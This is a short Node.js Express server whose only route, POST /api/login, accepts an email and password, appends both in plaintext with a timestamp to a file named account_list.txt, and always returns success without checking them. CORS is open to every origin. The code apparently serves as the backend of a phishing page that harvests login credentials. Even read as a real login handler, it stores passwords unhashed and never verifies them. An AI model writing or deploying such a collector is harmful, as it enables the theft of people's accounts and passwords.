import express from 'express';
import cors from 'cors';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.use(cors());
app.use(express.json());

app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const timestamp = new Date().toISOString();
    const credentialEntry = `\nTimestamp: ${timestamp}\nEmail: ${email}\nPassword: ${password}\n-------------------`;
    
    await fs.appendFile('account_list.txt', credentialEntry);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).json({ success: false, error: 'Failed to save credentials' });
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});